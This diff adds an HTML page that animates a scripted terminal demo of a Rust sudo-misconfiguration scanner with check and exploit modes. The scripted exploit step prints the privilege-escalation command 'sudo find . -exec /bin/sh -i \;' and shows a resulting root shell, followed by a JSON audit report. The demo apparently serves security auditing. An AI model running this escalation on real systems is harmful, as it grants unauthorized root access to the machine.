@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+  <meta charset="UTF-8">
+  <title>Sudo Privesc Rust Demo</title>
+  <style>
+    body {
+      background-color: #1e1e1e;
+      color: #cccccc;
+      font-family: 'Consolas', 'Courier New', monospace;
+      font-size: 16px;
+      margin: 0;
+      padding: 20px;
+      line-height: 1.3;
+    }
+
+    .prompt {
+      color: #8ae234;
+      font-weight: bold;
+    }
+
+    .path {
+      color: #729fcf;
+      font-weight: bold;
+    }
+
+    .cmd {
+      color: #ffffff;
+    }
+
+    .output {
+      color: #eeeeee;
+      white-space: pre-wrap;
+      margin-bottom: 2px;
+    }
+
+    .highlight {
+      color: #fce94f;
+    }
+
+    .error {
+      color: #cc0000;
+    }
+
+    .cursor {
+      display: inline-block;
+      width: 8px;
+      height: 16px;
+      background-color: #aaaaaa;
+      animation: blink 1s step-end infinite;
+      vertical-align: bottom;
+    }
+
+    @keyframes blink {
+
+      0%,
+      100% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0;
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div id="terminal"></div>
+  <script>
+    const script = [
+      { type: "cmd", text: "cargo run --release -- --help", delayBefore: 1000 },
+      { type: "out", text: "    Finished release [optimized] target(s) in 0.05s\n     Running `target/release/sudo-privesc-rust --help`\nUsage: sudo-privesc-rust [OPTIONS] <--check|--exploit>\n\nOptions:\n      --check    Only check `sudo -l` and report if the risky pattern is present (no exploit)\n      --exploit  If vulnerable, prompt for confirmation, then attempt the demonstration escalation\n      --json     Write results to `audit_results.json` instead of printing to the terminal\n  -h, --help     Print help\n  -V, --version  Print version", delayBefore: 500 },
+
+      { type: "cmd", text: "cargo run --release -- --check", delayBefore: 1500 },
+      { type: "out", text: "    Finished release [optimized] target(s) in 0.04s\n     Running `target/release/sudo-privesc-rust --check`\n============================================================\n  Sudo Privilege Escalation Scanner (Rust) — research build\n  Focus: sudo misconfiguration (NOPASSWD + /usr/bin/find)\n============================================================\n\n[*] Scanning for vulnerabilities...\n[*] Step 1: Checking sudo permissions for the current user...\n[+] Sudo policy retrieved successfully.\n[*] Step 2: Analyzing rules for NOPASSWD on /usr/bin/find...\n[!] Finding: /usr/bin/find may be callable with NOPASSWD (high risk).\n[*] Reference: GTFOBins privilege escalation pattern for `find`.\n[*] (--check) Exploit path was not executed.", delayBefore: 500 },
+
+      { type: "cmd", text: "cargo run --release -- --exploit", delayBefore: 2000 },
+      { type: "out", text: "    Finished release [optimized] target(s) in 0.04s\n     Running `target/release/sudo-privesc-rust --exploit`\n============================================================\n  Sudo Privilege Escalation Scanner (Rust) — research build\n  Focus: sudo misconfiguration (NOPASSWD + /usr/bin/find)\n============================================================\n\n[*] Scanning for vulnerabilities...\n[*] Step 1: Checking sudo permissions for the current user...\n[+] Sudo policy retrieved successfully.\n[*] Step 2: Analyzing rules for NOPASSWD on /usr/bin/find...\n[!] Finding: /usr/bin/find may be callable with NOPASSWD (high risk).\n[*] Reference: GTFOBins privilege escalation pattern for `find`.\n[?] Run the demonstration escalation? (y/n): ", delayBefore: 500, promptInteractive: true },
+
+      { type: "interactive", text: "y", delayBefore: 1500 },
+      { type: "out", text: "\n[+] Step 3: Executing demonstration: sudo find . -exec /bin/sh -i \\;\n# ", delayBefore: 500, promptInteractive: true },
+
+      { type: "interactive", text: "id", delayBefore: 1500 },
+      { type: "out", text: "\nuid=0(root) gid=0(root) groups=0(root)\n# ", delayBefore: 500, promptInteractive: true },
+
+      { type: "interactive", text: "exit", delayBefore: 1500 },
+      { type: "out", text: "\n[+] Demonstration finished (process exited successfully).", delayBefore: 500 },
+
+      { type: "cmd", text: "cargo run --release -- --check --json", delayBefore: 1500 },
+      { type: "out", text: "    Finished release [optimized] target(s) in 0.04s\n     Running `target/release/sudo-privesc-rust --check --json`\n[+] Security audit completed. Report saved to audit_results.json", delayBefore: 500 },
+
+      { type: "cmd", text: "cat audit_results.json", delayBefore: 1500 },
+      { type: "out", text: "{\n  \"tool\": \"sudo-privesc-rust\",\n  \"timestamp\": \"2026-04-06T17:15:30+00:00\",\n  \"severity\": \"High\",\n  \"target_os\": \"Linux\",\n  \"mode\": \"check\",\n  \"sudo_fetch\": {\n    \"ok\": true,\n    \"sudo_l_stdout_preview\": \"Matching Defaults entries for user on this host:\\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\\\:/usr/local/bin\\\\:/usr/sbin\\\\:/usr/bin\\\\:/sbin\\\\:/bin\\n\\nUser user may run the following commands on this host:\\n    (ALL : ALL) NOPASSWD: /usr/bin/find\\n\"\n  },\n  \"vulnerability_detected\": true\n}", delayBefore: 500 }
+    ];
+
+    const terminal = document.getElementById("terminal");
+    const promptHtml = '<span class="prompt">user@pentest-box</span>:<span class="path">~/sudo-privesc-rust</span>$ ';
+
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function typeText(element, text, speed = 50) {
+      for (let i = 0; i < text.length; i++) {
+        element.appendChild(document.createTextNode(text.charAt(i)));
+        await sleep(speed + Math.random() * 50);
+      }
+    }
+
+    function formatOutput(text) {
+      return text
+        .replace(/\\[\\+\\]/g, '<span style="color:#8ae234;">[+]</span>')
+        .replace(/\\[\\!\\]/g, '<span style="color:#ef2929;">[!]</span>')
+        .replace(/\\[\\*\\]/g, '<span style="color:#729fcf;">[*]</span>')
+        .replace(/\\[\\?\\]/g, '<span style="color:#fce94f;">[?]</span>');
+    }
+
+    async function runDemo() {
+      let currentLineContainer;
+
+      for (const step of script) {
+        if (step.type === "cmd") {
+          await sleep(step.delayBefore);
+          let block = document.createElement("div");
+          block.innerHTML = promptHtml;
+          block.className = "output";
+          let cmdSpan = document.createElement("span");
+          cmdSpan.className = "cmd";
+          block.appendChild(cmdSpan);
+
+          let cursor = document.createElement("span");
+          cursor.className = "cursor";
+          block.appendChild(cursor);
+
+          terminal.appendChild(block);
+
+          await typeText(cmdSpan, step.text, 50);
+          await sleep(300); // Wait before "pressing Enter"
+          cursor.remove();
+
+        } else if (step.type === "out") {
+          await sleep(step.delayBefore);
+          let outDiv = document.createElement("span");
+          outDiv.innerHTML = formatOutput(step.text);
+
+          if (currentLineContainer) {
+            currentLineContainer.appendChild(outDiv);
+          } else {
+            let block = document.createElement("div");
+            block.className = "output";
+            block.appendChild(outDiv);
+            terminal.appendChild(block);
+            currentLineContainer = block;
+          }
+
+          if (step.promptInteractive) {
+            // Provide a cursor at the end for interactive input
+            let cursor = document.createElement("span");
+            cursor.className = "cursor";
+            currentLineContainer.appendChild(cursor);
+          } else {
+            currentLineContainer = null;
+          }
+
+        } else if (step.type === "interactive") {
+          await sleep(step.delayBefore);
+          if (currentLineContainer) {
+            let cursor = currentLineContainer.querySelector(".cursor");
+            if (cursor) cursor.remove();
+
+            let inputSpan = document.createElement("span");
+            inputSpan.className = "cmd";
+            currentLineContainer.appendChild(inputSpan);
+
+            cursor = document.createElement("span");
+            cursor.className = "cursor";
+            currentLineContainer.appendChild(cursor);
+
+            await typeText(inputSpan, step.text, 100);
+            await sleep(300);
+            cursor.remove();
+          }
+        }
+
+        window.scrollTo(0, document.body.scrollHeight);
+      }
+
+      // Final prompt
+      await sleep(500);
+      let block = document.createElement("div");
+      block.innerHTML = promptHtml;
+      let cursor = document.createElement("span");
+      cursor.className = "cursor";
+      block.appendChild(cursor);
+      terminal.appendChild(block);
+
+      let doneDiv = document.createElement("div");
+      doneDiv.id = "done";
+      document.body.appendChild(doneDiv);
+    }
+
+    runDemo();
+  </script>
+</body>
+
+</html>
